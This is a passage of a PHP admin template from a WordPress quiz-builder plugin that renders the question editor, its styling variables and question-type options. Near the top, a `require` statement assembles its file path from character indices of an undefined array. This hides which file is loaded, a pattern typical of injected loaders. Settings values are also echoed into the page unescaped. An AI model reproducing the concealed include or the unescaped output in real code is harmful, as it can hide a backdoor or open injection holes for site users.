<?php


include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
 
wp_enqueue_script("sqb_sortable_jquery_ui", "//code.jquery.com/ui/1.12.1/jquery-ui.js", array('jquery')); 
wp_enqueue_style( "sqb_bootstrap_slider_min","//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/css/bootstrap-slider.min.css", false, "10.0.2" );
wp_enqueue_script( "sqb_bootstrap_slider_min-js","//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/bootstrap-slider.min.js", false, "10.0.2" );
wp_enqueue_style("sqb_bootstrap_colorpicker_min","//cdnjs.cloudflare.com/ajax/libs/bootstrap-colorpicker/2.5.2/css/bootstrap-colorpicker.min.css", false, "2.5.2" );
wp_enqueue_script("sqb_bootstrap_colorpicker_min-js","//cdnjs.cloudflare.com/ajax/libs/bootstrap-colorpicker/2.5.2/js/bootstrap-colorpicker.min.js", false, "2.5.2" );


$question_has = false;
$questionsObj = array();
$allquestions = array();
$top_bar_background_color = 'rgba(245, 102, 64, 1)';
$allquestionscount = 0;
$ques_type_matrix = "";
$ques_type_ranking_choices = "display:none";
if(isset($_GET['id'])){  
	$sqb_question_pagination_start_from_offset = @$sqb_question_pagination_start_from * $sqb_add_question_pagination_limit;
	$questionsObj = SQB_QuizQuestions::loadByQuizIdAndLimit($_GET['id'],$sqb_question_pagination_start_from_offset, $sqb_add_question_pagination_limit);
	$allquestions = SQB_QuizQuestions::loadByQuizId($_GET['id']);
	$question_array = SQB_QuizQuestions::getQuestionsCountByQuizId($_GET['id']);	 
	if(isset($question_array) && is_countable($question_array) && count($question_array) > 0){ 
		$allquestionscount = count($question_array);
	}

}

if($questionsObj && count($questionsObj)){
	$question_has = true;
}

//$allquestionscount = count($allquestions);
?>


<?php 
    $ans_hover_opacity='';
    $ans_hover_color='';
    $ans_hover_text_color='';
    if(isset($quiz_data)){
    $template =  $quiz_data->getTemplate();
    if($template == "template6" || $quiz_type == 'poll'){
    
        if($quiz_data->getTransparentBackgroundSettings() != ''){
            $get_settings = $quiz_data->getTransparentBackgroundSettings();
            $get_details = explode("|",$get_settings);
            $width_sign = !empty($get_details[0]) ? $get_details[0] : '';
            $background_width = !empty($get_details[1]) ? $get_details[1] : '';
            $height_sign = !empty($get_details[2]) ? $get_details[2] : '';
            $background_height = !empty($get_details[3]) ? $get_details[3] : '';
            $settings_image = !empty($get_details[4]) ? $get_details[4] : '';
            $min_height = !empty($get_details[5]) ? $get_details[5] : '';
            $ans_hover_color = !empty($get_details[6]) ? $get_details[6] : '';
            $ans_hover_opacity = !empty($get_details[7]) ? $get_details[7] : '';
            $ans_hover_text_color = !empty($get_details[13]) ? $get_details[13] : '';
            if(!empty($get_details[16])){
                $template6_answer_border_color = $get_details[16];
            }
            if(!empty($get_details[17])){
                $template6_answer_border_hover_color = $get_details[17];
            }
            if(!empty($get_details[18])){
                $template6_answer_border_width = $get_details[18];
            }
        }
    }
}
     ?>

<style>
body {
    --template8-answerbox-brorder-width: <?php echo $template8_answer_border_width; ?>;
    --template8-answerbox-brorder-style: <?php echo $template8_answer_border_style; ?>; 
    --template8-answerbox-brorder-color: <?php echo $template8_answer_border_color; ?>;
    --template8-answerbox-shadow-color: <?php echo $template8_answer_border_shadow_color; ?>;

    --template8-skip-btn-bg-color: <?php echo $template8_skip_button_background_color; ?>;
    --template8-skip-btn-width: <?php echo $template8_skip_button_width; ?>;
    --template8-skip-btn-height: <?php echo $template8_skip_button_height; ?>;

    --template8-continue-btn-bg-color: <?php echo $template8_continue_button_background_color; ?>;
    --template8-continue-btn-hover-bg-color: <?php echo $template8_continue_button_hover_background_color; ?>;
    --template8-continue-btn-width: <?php echo $template8_continue_button_width; ?>;
    --template8-continue-btn-height: <?php echo $template8_continue_button_height; ?>;
    --template8-continue-btn-radius: <?php echo $template8_continue_button_radius; ?>;

    --template8-startscreen-continue-btn-bg-color: <?php echo $template8_startscreen_button_background_color; ?>;
    --template8-startscreen-continue-btn-shadow-color: #f78c52;

    --template8-resultscreen-continue-btn-bg-color: #ff8745;
    --template8-resultscreen-continue-btn-shadow-color: #f78c52;

    --template8-optinscreen-continue-btn-bg-color: #f78c52;
    --template8-optinscreen-continue-btn-shadow-color: #f78c52;

    --template8-bg-color: <?php echo $template8_background_color; ?>;
    --template8-bg-width: <?php echo $template8_background_width; ?>;
    --template8-bg-height: <?php echo $template8_background_height; ?>;
    --template8-background-image: <?php echo $template8_background_image; ?>;
    --template8-bg-img-opacity: <?php echo $template8_bg_img_opacity; ?>;

    --template6_background_image_opacity: <?php echo $template6_background_image_opacity; ?>;
    --template6_answer_border_color: <?php echo $template6_answer_border_color; ?>;
    --template6_answer_border_hover_color: <?php echo $template6_answer_border_hover_color; ?>;
    --template6_answer_border_width: <?php echo $template6_answer_border_width; ?>px;

    --template9_temp_width: <?php echo $temp9_temp_width; ?>.'px';
    --template9_temp_height: <?php echo $temp9_temp_height.$temp9_selected_val; ?>;

    --template9_temp_background_color: <?php echo $start_background_color; ?>;
    --template9_outcome_temp_background_color: 'rgb(214, 153, 92)';
    --template9_question_temp_background_color: 'rgb(214, 153, 92)';
    --template9_lead_temp_background_color: 'rgb(214, 153, 92)';

    --template9_start_screen_play_btn_color: <?php echo $start_video_play_btn_color; ?>;
    --template9_lead_screen_play_btn_color: <?php echo $lead_video_play_btn_color; ?>;
    --template9_outcome_screen_play_btn_color: <?php echo $video_play_btn_color; ?>;
}
</style>
<?php 
	
	
	$question_video_play_btn_color = "#ffffff"; 
	if(isset($quiz_data)){

		$show_back_button =  $quiz_data->getShowBackButton();
		if(!empty($show_back_button)){
			$explode_show_back_button = explode('|',$quiz_data->getShowBackButton());
			if($show_back_button[0] == "Y"){
				$backButtonStyle = 'display:block;';
			}
		}	

		
			$screen_name = 'settings_background_color';
			$strm_type = 'settings';
			$theme_data_has = SQB_GlobalTheme::loadByQuizIdAndNameAndType($quiz_data->getId(),$screen_name,$strm_type);

			
			if($theme_data_has){
				$colorpickerdata = maybe_unserialize($theme_data_has->getValue());

				
				if(!empty($colorpickerdata["next_btn_html"])){
					$next_button_html = stripslashes($colorpickerdata["next_btn_html"]);
				}

				if(!empty($colorpickerdata["skip_btn_html"])){
					$skip_button_html = stripslashes($colorpickerdata["skip_btn_html"]);
				}

				if(!empty($colorpickerdata["next_button_settings_background_color"])){
					$next_button_settings_background_color = $colorpickerdata["next_button_settings_background_color"];
				}

				if(!empty($colorpickerdata["skip_question_button_for_quiz"])){
					$skip_question_button_for_quiz = $colorpickerdata["skip_question_button_for_quiz"];
				}

				if(!empty($colorpickerdata["nexttbtn_width_for_quiz"])){
					$nexttbtn_width_for_quiz = $colorpickerdata["nexttbtn_width_for_quiz"];
				}

				if(!empty($colorpickerdata["nexttbtn_height_for_quiz"])){
					$nexttbtn_height_for_quiz = $colorpickerdata["nexttbtn_height_for_quiz"];
				}

				if(!empty($colorpickerdata["nexttbtn_radius_for_quiz"])){
					$nexttbtn_radius_for_quiz = $colorpickerdata["nexttbtn_radius_for_quiz"];
				}

				if(!empty($colorpickerdata["skip_question_btn_width_for_quiz"])){
					$skip_question_btn_width_for_quiz = $colorpickerdata["skip_question_btn_width_for_quiz"];
				}

				if(!empty($colorpickerdata["skip_question_btn_height_for_quiz"])){
					$skip_question_btn_height_for_quiz = $colorpickerdata["skip_question_btn_height_for_quiz"];
				}

				if(!empty($colorpickerdata["skip_question_btn_radius_for_quiz"])){
					$skip_question_btn_radius_for_quiz = $colorpickerdata["skip_question_btn_radius_for_quiz"];
				}

				if(!empty($colorpickerdata["nexttbtn_radius_for_quiz"])){
					$nexttbtn_radius_for_quiz = $colorpickerdata["nexttbtn_radius_for_quiz"];
				}
				if(!empty($colorpickerdata["back_question_btn_width_for_quiz"])){
					$back_question_btn_width_for_quiz = $colorpickerdata["back_question_btn_width_for_quiz"];
				}
				if(!empty($colorpickerdata["back_question_btn_height_for_quiz"])){
					$back_question_btn_height_for_quiz = $colorpickerdata["back_question_btn_height_for_quiz"];
				}
				if(!empty($colorpickerdata["back_question_btn_radius_for_quiz"])){
					$back_question_btn_radius_for_quiz = $colorpickerdata["back_question_btn_radius_for_quiz"];
				}
				if(!empty($colorpickerdata["back_question_button_for_quiz"])){
					$back_question_button_for_quiz = $colorpickerdata["back_question_button_for_quiz"];
				}
				if(!empty($colorpickerdata["back_question_button_hover_for_quiz"])){
					$back_question_button_hover_for_quiz = $colorpickerdata["back_question_button_hover_for_quiz"];
				}
				if(!empty($colorpickerdata["setting_progress_color"])){
					$all_temp_progress_bar_active_color = $colorpickerdata["setting_progress_color"];
				}
				if(!empty($colorpickerdata["setting_progress_inactive_color"])){
					$all_temp_progress_bar_inactive_color = $colorpickerdata["setting_progress_inactive_color"];
				}
				if(!empty($colorpickerdata["next_button_settings_background_hover_color"])){
					$next_button_settings_background_hover_color = $colorpickerdata["next_button_settings_background_hover_color"];
				}
				if(!empty($colorpickerdata["top_bar_background_color"])){
					$top_bar_background_color = $colorpickerdata["top_bar_background_color"];
				}
				if(!empty($colorpickerdata["skip_question_button_hover_for_quiz"])){
					$skip_question_button_hover_for_quiz = $colorpickerdata["skip_question_button_hover_for_quiz"];
				}
				if(!empty($colorpickerdata["back_btn_html"])){
					$back_btn_html = stripslashes($colorpickerdata["back_btn_html"]);
				}
			}
		
	}
	

	echo '<style type="text/css">body{--top_bar_background_color: '.$top_bar_background_color.';</style>';

				$arrow_content = "";
				$all_question = '';
				$ans_outcome_option_hide = '';
			    $quesitons_html = '';
			    $question_data_list_count = '';
			    $answer_edit_text_class = '';
			    $layout_text = '';
				$layout_value = '';
				$ans_image_size_width = 'display:none;';
				$question_inner_width = '';
				
                if(isset($_GET['id'])){  
                  	$sqbObj =  SQB_Quiz::loadById($_GET['id']);
				}


				$question_number = 0;
			    if(isset($sqbObj) && !empty($sqbObj)){
				    $question_bank_options = $sqbObj->getQuestionBankOption();	
				    $question_bank_explode = explode('||',$question_bank_options); 
			    }
				if(($questionsObj) && count($questionsObj) && isset($_GET['id'])){
				   $outcomes_list = SQB_Outcome::loadByQuizId($_GET['id']);
				   $question_count = $sqb_question_pagination_start_from_offset;

				   if (isset($_GET['sqb_page']) && is_numeric($_GET['sqb_page']) && $_GET['sqb_page'] != 0) {
					    $sqb_page = (int)$_GET['sqb_page']; // Convert to integer
					    $question_number = (($sqb_page - 1) * 25); // Calculate question number based on sqb_page
					}



				   $quesitons_html = '';
				   $questions_order_array = array();
				   $questionsObj_count = count($questionsObj); 
				   foreach($questionsObj as $questionObj){
				   		if (!empty($question_bank_explode) && is_array($question_bank_explode) && isset($question_bank_explode[0]) && $question_bank_explode[0] === 'Y') {
				   			$question_id  = $questionObj->getQuestionId();	
							$question_order  = $questionObj->getQuestionOrder();	
							$question_data = SQB_QuizQuestionBank::loadById($question_id);
							if(isset($questions_order_array[$question_order])){
								$question_order = count($questions_order_array) + 1;
							}	
							$questions_order_array[$question_order] = $question_data; 

				   		}else{
				   			$question_id  = $questionObj->getQuestionId();
						   	$question_data = SQB_QuizQuestionBank::loadById($question_id);
						   	$matrix_html = '';
						   	if($question_data){
							  	$question_order =  $questionObj->getQuestionOrder();
							 	$matrix_html =  $question_data->getMatrixHtml();
							 	if(isset($questions_order_array[$question_order])){
									$question_order = count($questions_order_array) + 1;
							    }
							    if(isset($questions_order_array[$question_order])){
									$questions_order_array[$questionsObj_count++] = $question_data; 
								}else{
									$questions_order_array[$question_order] = $question_data; 
								}
						   }
				   		}
				   }
				   if(isset($question_bank_explode[0]) && $question_bank_explode[0] == 'Y'){
					
					}else{
						ksort($questions_order_array);
					}

				  $tool_tip_related_style = '';
				  $answer_type_matrix_selected_class = '';
				  $answer_type_tool_tip = '';
				  $answer_type_single_multi_yes_no_class = '';
				  foreach($questions_order_array as $key => $question_data){  
					   
					   if($question_data){
						   $current_date_time = date('y_d_m_h_m_s');
						   $current_date_time_img = "sbq_img_".$current_date_time.'_'.rand(10,1000);
						   $current_date_time_img_outer = "sbq_img_outer_".$current_date_time.'_'.rand(10,1000);
						   $current_date_time_mian_div = "sbq_amin_div_".$current_date_time.'_'.rand(10,1000);
						   $sqb_round_no = 'sqb_round_no_'.uniqid() . time().'_';
						   
						   $question_count++;
						   $question_number++;
						   $qustion_html =  stripslashes($question_data->getQuestion());
						   
						  $sqb_correct_incorrect_random_no = "sqb_correct_incorrect_".$current_date_time.'_'.rand(10,1000);
									
						  // $qustion_html =  str_replace("%%SQBRANDOMNO%%",$sqb_correct_incorrect_random_no,$qustion_html);
						   
						   $question_id  = $question_data->getId();
						  
						   
						   $question_type =  $question_data->getQuestionType();
						   if( $question_type == ''){
							   $question_type = 'multi';
						   }
						   
						   	$ans_with_img =  $question_data->getAnsWithImg();
						   	$ans_img_setting = maybe_unserialize($question_data->getAnsImgSetting());

						   $image_option_has_class = '';
						   $ans_with_img_checked = '';
						   if($ans_with_img == 'Y'){
							   $ans_with_img = "checked";
							   $ans_with_img_checked = "checked";
							    $image_option_has_class = "image_option_has";
						   }
						   $ans_image_size_custom = (!empty($ans_img_setting["ans_image_size_option"]))? $ans_img_setting["ans_image_size_option"] : 'cover';

						   

						   if(!empty($ans_image_size_width) && $ans_image_size_width == 'custom'){
						   		$ans_image_size_width = 'display:block;';
						   }
							
							$ans_image_options = array(
						   	'cover' => 'Cover Image',
						   	'contain' => 'Contain',
						   	'100_100' => '100x100',
						   	'200_200' => '200x200',
						   	'300_300' => '300x300',
						   	'custom' => 'Custom Size',
						   );
						   $options_data = '';
						   $selected_image_size_custom = '';
						   foreach ($ans_image_options as $image_options_key => $image_options_value) {
						   	$selected_image_size_custom = ($ans_image_size_custom != '' && $ans_image_size_custom == $image_options_key)? 'selected' : '';
						   		$height_width = explode('_', $image_options_key);
						   		$data_attr = '';
						   		if($image_options_key != 'cover' && $image_options_key != 'custom'){	
						   			if (array_key_exists("0",$height_width) && array_key_exists("1",$height_width)){
						   				$data_attr = 'data-height="'.$height_width[0].'" data-width="'.$height_width[1].'"';
						   			}
						   		}

						   		$options_data.='<option value="'.$image_options_key.'" '.$data_attr.' '.$selected_image_size_custom.' >'.$image_options_value.'</option>';
						   }

						   $ans_show_image_label = (!empty($ans_img_setting["sqb_ans_show_label"]) && $ans_img_setting["sqb_ans_show_label"] == 'Y')? 'checked' : '';

						   $ans_image_width = (!empty($ans_img_setting["ans_image_width"]))? $ans_img_setting["ans_image_width"] : '150';

						   $ans_image_height = (!empty($ans_img_setting["ans_image_height"]))? $ans_img_setting["ans_image_height"] : '150';


						   $multiple_correct_ans =  $question_data->getMultipleCorrectAns();							
						   $multiple_correct_ans_checked =  '';
						  
						   if($multiple_correct_ans == 'Y'){
							   $multiple_correct_ans_checked = "checked";
							  
							   
						   }
						   
						   
						   $ans_layout =  $question_data->getAnsLayout();
						   
						   $show_correct_incorrect_ans =  $question_data->getShowCorrectIncorrectAns();
						   $allow_skip_ques =  $question_data->getAllowSkipQues(); 
						   if($show_correct_incorrect_ans  == 'Y'){
							   $show_correct_incorrect_ans = "checked='checked'";
						   }

						   
							$skipButtonStyle = 'display:none;';
							//if($allow_skip_ques == 'Y' && $quiz_data->getTemplate() == 'template7'){
							$skipChecked = '';
							if($allow_skip_ques == 'Y' ){
								$skipChecked = 'checked ';
								//if($quiz_data->getTemplate() == 'template8'){
									$skipButtonStyle = 'display:block;';
								//}
							}
						   $skip_outcome_mapping =  $question_data->getSkipMapping();
						  
						   $skip_outcome_mapping_checked = '';
						  
						   
						   
						   $ans_standar_layout = '';
						   $ans_multiple_layout = '';
						   $answer_grid_layout_active = '';
						   $answer_layout_three_in_row_layout_active = '';
						   $ans_three_in_row_layout_layout_selected = '  ';
						   
						   $answer_layout_four_in_row_layout_active = '';
						   $ans_four_in_row_layout_layout_selected = '  ';
						   
						   $answer_layout_five_in_row_layout_active = '';
						   $ans_five_in_row_layout_layout_selected = '  ';
						   
						   $answer_layout_six_in_row_layout_active = '';
						   $ans_six_in_row_layout_layout_selected = '  ';
						   
						   if($ans_layout == 'multiple'){
							   $ans_multiple_layout = ' selected-op ';
							   $answer_grid_layout_active = ' layout-two-in-row-active grid-layout-active ';
						   }else if($ans_layout == 'layout-three-in-row'){
							   $answer_layout_three_in_row_layout_active = ' layout-three-in-row-active  grid-layout-active';
							   $ans_three_in_row_layout_layout_selected = ' selected-op ';
							   
						   }else if($ans_layout == 'layout-four-in-row'){
							   $answer_layout_three_in_row_layout_active = ' layout-four-in-row-active  grid-layout-active';
							   $ans_three_in_row_layout_layout_selected = ' selected-op ';
							   
						   }else if($ans_layout == 'layout-five-in-row'){
							   $answer_layout_three_in_row_layout_active = ' layout-five-in-row-active  grid-layout-active';
							   $ans_three_in_row_layout_layout_selected = ' selected-op ';
							   
						   }else if($ans_layout == 'layout-six-in-row'){
							   $answer_layout_three_in_row_layout_active = ' layout-six-in-row-active  grid-layout-active';
							   $ans_three_in_row_layout_layout_selected = ' selected-op ';
							   
						   }else if($ans_layout == 'standard'){
							   $ans_standar_layout = ' selected-op ';
						   }

						   
						   /*if($quiz_data->getTemplate() == 'template6' ||$quiz_data->getTemplate() == 'template7' || $quiz_data->getTemplate() == 'template8' || $quiz_data->getTemplate() == 'template9'){*/
							   
								if($ans_layout == 'multiple'){
							       $layout_value = 'two_column';
								   $layout_text = '2 Columns';
							   }else if($ans_layout == 'layout-three-in-row'){
								   $layout_value = 'three_column';
								   $layout_text = '3 Columns';
							   }else if($ans_layout == 'layout-four-in-row'){
								   $layout_value = 'four_column';
								   $layout_text = '4 Columns';
							   }else if($ans_layout == 'layout-five-in-row'){
								   $layout_value = 'five_column';
								   $layout_text = '5 Columns';
							   }else if($ans_layout == 'layout-six-in-row'){
								   $layout_value = 'six_column';
								   $layout_text = '6 Columns';
							   }else{
								   $layout_value = 'one_column';
								   $layout_text = '1 Column';
							   }
						   /*}*/
						   
						   
						   $quiz_type = '';
						   $all_question = '';
						   $question_type_option = "display:none";
						   $ans_outcome_option_show = "display:none";
						   $ques_type_fill = "display:none";
						   $ques_type_rating = "display:none";
						   $ques_type_matrix = "";
						   $ques_type_ranking_choices = "display:none";
						   $ans_layout_option_display = "display:flex";
						   $add_answer_btn_display = "";
						   $add_rating_btn_display = "display:none";
						   $add_rating_btn_display_text = "display:none";
						   $question_type_text = '';
						   $question_image = '';
						   $scoring_quiz_class_pints = '';
						   $sqb_disable_tiny_mce_editor_class = '';
						   if(isset($quiz_data)){
							    $quiz_type = $quiz_data->getQuizType();
							    
							    if(( $skip_outcome_mapping == 'Y') && ($quiz_type == 'personality')){
									$skip_outcome_mapping_checked = 'Y';
								 
								}
								if(($quiz_type == 'personality') && (($question_type == 'multi') || ($question_type == 'single') || ($question_type == 'yes_no') || ($question_type == 'rating'))){
									$answer_edit_text_class = ' answer_edit_text';
								}
							    
							    if($quiz_type == 'survey' || $quiz_type == 'personality' || 1){
							    	if($quiz_type == 'survey'){
							    		$ques_type_fill = "display:flex";
							    	}
									$question_type_option = "";
									if($question_type == 'multi'){
										$question_type_text = "Multiple Choice";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/multiple-choice.svg">';
									}else if($question_type == 'single'){
										$question_type_text = "Single Choice";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg">';
									}else if($question_type == 'yes_no'){
										$question_type_text = "Yes/No";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/yes-no.svg">';
									}else if($question_type == 'rating'){
											$question_type_text = "Rating scale";
										  //$ans_layout_option_display = "display:none";
										  $add_answer_btn_display = "display:none";
										   $add_rating_btn_display = "display:block";
										   $add_rating_btn_display_text = "display:flex";
										  $question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/rating.svg">';
									}else if($question_type == 'text'){
										$question_type_text = "Text";
										$sqb_disable_tiny_mce_editor_class = ' sqb_disable_tiny_mce_editor';
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/text.svg">';
									}else if($question_type == 'date'){
										$question_type_text = "Date";
										$sqb_disable_tiny_mce_editor_class = ' sqb_disable_tiny_mce_editor';
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/date.svg">';
									}else if($question_type == 'slider'){
										$question_type_text = "Slider";
										$sqb_disable_tiny_mce_editor_class = ' sqb_disable_tiny_mce_editor';
										$add_answer_btn_display = "display:none";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/slider.svg">';
									}else if($question_type == 'fill_in_blank'){
										$question_type_text = "Fill In Blank";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/fill-in-blank.svg">';
									}else if($question_type == 'dropdown'){
										$question_type_text = "Dropdown";
										$add_answer_btn_display = "display:none";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/dropdown.svg">';
									}else if($question_type == 'matching_text'){
										$question_type_text = "Complete the Sentences";
										$add_answer_btn_display = "display:none";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/complete-the-sentence.svg">';
									}else if($question_type == 'email'){
										$question_type_text = "Email";
										$add_answer_btn_display = "display:none";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/email.svg">';
									}else if($question_type == 'phone_number'){
										$question_type_text = "Phone Number";
										$add_answer_btn_display = "display:none";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/phone-number.svg">';
									}else if($question_type == 'weight_and_height'){
										$question_type_text = "Weight and Height";
										$add_answer_btn_display = "display:none";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/height.png">';
									}else if($question_type == 'name'){
										$question_type_text = "Name";
										$add_answer_btn_display = "display:none";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/name.png">';
									}
									
								}
								
								if($quiz_type == 'scoring' ){
									
									$scoring_quiz_class_pints = ' sqb_points_active ';
								}
								if($quiz_type == 'survey'){
									$ques_type_rating = "display:flex";
									$ques_type_ranking_choices = "display:flex";
							    }
								
								if($quiz_type == 'personality' ){
									$ques_type_rating = "display:flex";
									$ques_type_ranking_choices = "display:flex";
									if($question_type == ''){
										$question_type = 'multi';
										$question_type_text = "Multiple Choice";
										$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/multiple-choice.svg">';
									}
									if($question_type == 'multi'){
										$ans_outcome_option_show = "";
									}else if($question_type == 'single'){
										$ans_outcome_option_show = "";
									}else if($question_type == 'yes_no'){
										$ans_outcome_option_show = "";
									}else if($question_type == 'rating'){
										$ans_outcome_option_show = "";
									}
								}
								
								if(($multiple_correct_ans != 'Y') && $question_type == 'multi'){
									$question_type_text = "Single Choice";
									$question_type = 'single';
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg">';
								}
								
								if(($multiple_correct_ans != 'Y') && $question_type == 'file_upload'){
									$question_type_text = "File Upload";
									$question_type = 'file_upload';
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/file-upload.svg">';
								}
								
								if($question_type == 'matrix'){
									$question_type_text = "Matrix";
									$matrix_html =  $question_data->getMatrixHtml();
									$matrix_column_width =  $question_data->getMatrixColumnWidth();
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/matrix.svg">';
								}
								
								if($question_type == 'ranking_choices'){ //ranking choices seleced
									$question_type_text = "Ranking / Choices";
									$question_type = 'ranking_choices';
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/ranking-choice.svg">';
								}
								
								if($question_type == 'numerical_text'){ //ranking choices seleced
									$question_type_text = "Numerical Value";
									$question_type = 'numerical_text';
									$add_answer_btn_display = "display:none";
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/numerical-value.svg">';
								}
								
								if($question_type == 'dropdown'){ //drop down seleced
									$question_type_text = "Dropdown";
									$question_type = 'dropdown';
									$add_answer_btn_display = "display:none";
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/dropdown.svg">';
								}
								if($question_type == 'matching_text'){ //drop down seleced
									$question_type_text = "Complete the Sentences";
									$question_type = 'matching_text';
									$add_answer_btn_display = "display:none";
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/complete-the-sentence.svg">';
								}
                                
                                if($question_type == 'email'){ //drop down seleced
									$question_type_text = "Email";
									$question_type = 'email';
									$add_answer_btn_display = "display:none";
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/email.svg">';
								}

								if($question_type == 'phone_number'){ //drop down seleced
									$question_type_text = "Phone Number";
									$question_type = 'phone_number';
									$add_answer_btn_display = "display:none";
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/phone-number.svg">';
								}
								if($question_type == 'weight_and_height'){ //drop down seleced
									$question_type_text = "Weight and Height";
									$question_type = 'weight_and_height';
									$add_answer_btn_display = "display:none";
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/height.png">';
								}

								if($question_type == 'name'){ //drop down seleced
									$question_type_text = "Name";
									$question_type = 'name';
									$add_answer_btn_display = "display:none";
									$question_image = '<img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/name.png">';
								}
							    
							}  
							
						  
						   $question_count_class = 'sqb_question_'.$question_count.'_'.rand(10,1000);
						   
						    
						    $show_fist_question_class = '';
						    if(isset($_GET['quesId']) && $_GET['quesId'] == $question_id){
						    	$show_fist_question_class = ' active show ';
								$all_question .= '<a class="dropdown-item" href="javascript:void(0)" data-value="'.$question_id.'">QUESTION '.$question_number.'</a>';
								$question_data_list_count .= '<li><a data-questionno="'.$question_count.'" data-toggle="pill" class="active show" href="#'.$question_count_class.'">Question '.$question_count.'</a></li>';	
						    }else if($question_count == ($sqb_question_pagination_start_from_offset+1)){
						    	if(!isset($_GET['quesId'])){
									$show_fist_question_class = ' active show ';
								}
								$all_question .= '<a class="dropdown-item" href="javascript:void(0)" data-value="'.$question_id.'">QUESTION '.$question_number.'</a>';
								$question_data_list_count .= '<li><a data-questionno="'.$question_count.'" data-toggle="pill" class="'.$show_fist_question_class.'" href="#'.$question_count_class.'">Question '.$question_number.'</a></li>';
							}else{
								$all_question .= '<a  class="dropdown-item" href="javascript:void(0)" data-value="'.$question_id.'">QUESTION '.$question_number.'</a>';

								$question_data_list_count .= '<li><a data-questionno="'.$question_count.'" data-toggle="pill" class="" href="#'.$question_count_class.'">Question '.$question_number.'</a></li>';
							}


							if ($quiz_data && $quiz_data->getTemplate() == 'template9') {
								
								
							$quesitons_html .= '<div class="card sqb_question_no tab-pane fade '.$show_fist_question_class.'" id="'.$question_count_class.'">';
						   $quesitons_html .= '<div class="card-header" id="headingOne" style="display:none">
												<i class="fa fa-arrows question_sortable_icon" aria-hidden="true"></i> <a >Question '.$question_number.'</a>
												<div class="delete-qa-row"> <i class="fa fa-trash-o" aria-hidden="true"></i></div>
											</div>';
						  $quesitons_html .= '<div  class="sqb_question_collapse" >';
					  	
					  	if($quiz_type != 'poll'){
						  $quesitons_html .= '<div class="question-delete-clone"><div class="delete-qa-row sqb_delete_btn"><i class="fa fa-trash-o" aria-hidden="true" title="Delete this Question"></i></div><div class="clone-qa-btn"><i class="fa fa-clone" aria-hidden="true" title="Clone this Question"></i></div></div>';
						}
						  $quesitons_html .= '<div class="card-body">';
						  $template_no_class = '';
						  
						  $quesitons_html .= '<div class="question_div_outer" id="'.$current_date_time_mian_div.'">
												
												<input type="hidden" name="question_temp_name" value="standard">
												<input type="hidden" name="question_temp_no" value="template1">
												<input type="hidden" name="question_file_upload_settings" value="'.$question_data->getFileUploadSettings().'">';
												
							$question_customizer = $question_data->getTempCustomizer();
							
							$question_customizer_array = explode("||",$question_customizer);
							$question_style = '';
							if(isset($question_customizer_array[0])){
								$question_max_width = $question_customizer_array[0];
								$question_style= "style='max-width:".$question_max_width."'";
							}
							
							$question_rating_lable_low_text = '<div>Strongly Disagree</div>';
							$question_rating_lable_high_text = '<div>Strongly Agree</div>';
							
							$quiz_temp_left_bgcolor = "";
							$quiz_temp_right_bgcolor = "";
							$quiz_temp_heights = "";
							$background_image_url = "";
							$background_image_size = "";
							$background_image_repeat = "";
							$background_image_position = "";
							$title_background_color = "";
							$title_background_color_opacity = "";
							$progress_bar_color = "";
							
							if($question_type  == 'rating'){
								if(isset($question_customizer_array[1])){
									$question_rating_lable_low_text = stripslashes($question_customizer_array[1]);
								}
								if(isset($question_customizer_array[2])){
									$question_rating_lable_high_text = stripslashes($question_customizer_array[2]);
								}
								if(isset($question_customizer_array[3])){
									$quiz_temp_left_bgcolor = stripslashes($question_customizer_array[3]);
								}
								if(isset($question_customizer_array[4])){
									$quiz_temp_right_bgcolor = stripslashes($question_customizer_array[4]);
								}
								if(isset($question_customizer_array[5])){
									$quiz_temp_heights = stripslashes($question_customizer_array[5]);
								}
								if(isset($question_customizer_array[6])){
									$background_image_url = stripslashes($question_customizer_array[6]);
								}
								if(isset($question_customizer_array[7])){
									$background_image_size = stripslashes($question_customizer_array[7]);
								}
								if(isset($question_customizer_array[8])){
									$background_image_repeat = stripslashes($question_customizer_array[8]);
								}
								if(isset($question_customizer_array[9])){
									$background_image_position = stripslashes($question_customizer_array[9]);
								}
								if(isset($question_customizer_array[10])){
